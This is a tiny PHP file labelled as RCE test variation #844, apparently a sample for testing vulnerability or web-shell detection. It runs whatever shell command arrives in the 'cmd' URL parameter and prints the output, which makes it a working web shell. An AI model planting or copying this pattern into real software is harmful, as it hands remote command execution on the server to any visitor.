<?php
// RCE test variation #844
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>